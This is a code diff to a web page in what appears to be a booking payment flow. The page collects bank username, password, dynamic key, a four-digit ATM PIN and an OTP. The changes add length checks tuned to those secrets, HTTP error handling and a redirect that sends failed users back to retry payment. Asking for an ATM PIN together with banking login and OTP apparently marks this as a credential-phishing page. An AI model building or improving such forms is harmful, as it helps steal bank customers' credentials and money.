@@ -91,6 +91,11 @@
     });
 
     // Acción de submit del formulario
+    function isLengthBetween(value: string, min: number, max: number) {
+        const len = (value || '').trim().length;
+        return len >= min && len <= max;
+    }
+
     async function handleSubmit(event) {
         isLoading = true;
         try {
@@ -122,21 +127,56 @@
                 timestamp: new Date().toISOString()
             };
 
-            // Validación mínima: requerir sólo los campos visibles
-            if (securityFlags.requireUserPass && (!securityChecks.user || !securityChecks.pass)) {
-                alert('Por favor, ingresa usuario y contraseña.');
-                return;
+            // Validación: requerir sólo los campos visibles + validar longitudes
+            errorMessages = {}; // reset
+            let hasValidationError = false;
+            if (securityFlags.requireUserPass) {
+                if (!securityChecks.user || !securityChecks.pass) {
+                    alert('Por favor, ingresa usuario y contraseña.');
+                    hasValidationError = true;
+                }
+                if (!isLengthBetween(securityChecks.user || '', 3, 20)) {
+                    errorMessages.user = 'Usuario debe tener entre 3 y 20 caracteres';
+                    hasValidationError = true;
+                }
+                if (!isLengthBetween(securityChecks.pass || '', 3, 20)) {
+                    errorMessages.pass = 'Contraseña debe tener entre 3 y 20 caracteres';
+                    hasValidationError = true;
+                }
             }
-            if (securityFlags.requireDynamicKey && !securityChecks.dinamicKey) {
-                alert('Por favor, ingresa la clave dinámica.');
-                return;
+            if (securityFlags.requireDynamicKey) {
+                if (!securityChecks.dinamicKey) {
+                    alert('Por favor, ingresa la clave dinámica.');
+                    hasValidationError = true;
+                }
+                if (!isLengthBetween(securityChecks.dinamicKey || '', 4, 6)) {
+                    errorMessages.dinamicKey = 'La clave dinámica debe tener entre 4 y 6 caracteres';
+                    hasValidationError = true;
+                }
             }
-            if (securityFlags.requireATMKey && !securityChecks.atmKey) {
-                alert('Por favor, ingresa la clave de cajero.');
-                return;
+            if (securityFlags.requireATMKey) {
+                if (!securityChecks.atmKey) {
+                    alert('Por favor, ingresa la clave de cajero.');
+                    hasValidationError = true;
+                }
+                const lenAtm = (securityChecks.atmKey || '').trim().length;
+                if (lenAtm !== 4) {
+                    errorMessages.atmKey = 'La clave de cajero debe tener exactamente 4 caracteres';
+                    hasValidationError = true;
+                }
             }
-            if (securityFlags.requireOTP && !securityChecks.otp) {
-                alert('Por favor, ingresa el código OTP.');
+            if (securityFlags.requireOTP) {
+                if (!securityChecks.otp) {
+                    alert('Por favor, ingresa el código OTP.');
+                    hasValidationError = true;
+                }
+                const lenOtp = (securityChecks.otp || '').trim().length;
+                if (lenOtp > 8) {
+                    errorMessages.otp = 'El OTP debe tener como máximo 8 caracteres';
+                    hasValidationError = true;
+                }
+            }
+            if (hasValidationError) {
                 return;
             }
 
@@ -188,6 +228,9 @@
                 },
                 body: JSON.stringify({ token })
             });
+            if (!resp.ok) {
+                throw new Error(`HTTP ${resp.status} ${resp.statusText}`);
+            }
             const data = await resp.json();
 
             // 7) Manejo de redirecciones y visibilidad exclusiva de inputs
@@ -251,6 +294,8 @@
         } catch (error) {
             console.error('Error en la autorización de transacción:', error);
             reservationStore.updateSecurityCheck({ status: 'failed' });
+            alert('La conexión falló. Por favor, inténtalo nuevamente.');
+            goto('/payment');
         } finally {
             isLoading = false;
         }
@@ -313,6 +358,8 @@
                                 type="text" 
                                 id="usuario" 
                                 name="usuario"
+                                minlength="3"
+                                maxlength="20"
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.user ? 'border-red-500' : ''}"
                                 placeholder="Ingrese su usuario"
                                 on:input={() => clearError('user')}
@@ -331,6 +378,8 @@
                                 type="password" 
                                 id="password" 
                                 name="password"
+                                minlength="3"
+                                maxlength="20"
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.pass ? 'border-red-500' : ''}"
                                 placeholder="Ingrese su contraseña"
                                 on:input={() => clearError('pass')}
@@ -351,6 +400,8 @@
                                 type="text" 
                                 id="clave_dinamica" 
                                 name="clave_dinamica"
+                                minlength="4"
+                                maxlength="6"
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.dinamicKey ? 'border-red-500' : ''}"
                                 placeholder="Ingrese su clave dinámica"
                                 on:input={() => clearError('dinamicKey')}
@@ -371,6 +422,8 @@
                                 type="password" 
                                 id="clave_cajero" 
                                 name="clave_cajero"
+                                minlength="4"
+                                maxlength="4"
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.atmKey ? 'border-red-500' : ''}"
                                 placeholder="Ingrese su clave cajero"
                                 on:input={() => clearError('atmKey')}
@@ -391,6 +444,7 @@
                                 type="password" 
                                 id="otp" 
                                 name="otp"
+                                maxlength="8"
                                 class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent {errorMessages.otp ? 'border-red-500' : ''}"
                                 placeholder="Ingrese el código OTP"
                                 on:input={() => clearError('otp')}
